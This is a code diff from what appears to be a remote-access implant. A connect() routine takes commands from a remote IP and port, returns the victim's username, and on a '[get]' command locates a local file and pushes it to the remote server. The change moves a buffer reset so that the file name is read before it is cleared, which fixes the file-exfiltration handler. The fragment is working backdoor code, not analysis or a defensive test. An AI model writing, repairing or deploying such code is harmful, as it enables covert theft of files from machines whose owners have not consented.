@@ -389,7 +389,6 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                 username = get_user()
                 send_data(conn,username)
             elif "[get]" in data:  #find file locally then push to remote server
-                data = ""
                 if VERBOSE:
                     print_info("Received GET")
                 file_name = data.split()[1].strip("[END]")
@@ -397,6 +396,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                     if VERBOSE:
                         print_info("File Found! :) --> {}".format(file_name))
                     send_data(conn, "[file-found]")
+                    data = ""
                     while not data.endswith('[END]'):
                         recv_decoded = recv.decode('utf-8')
                         data = data + recv_decoded
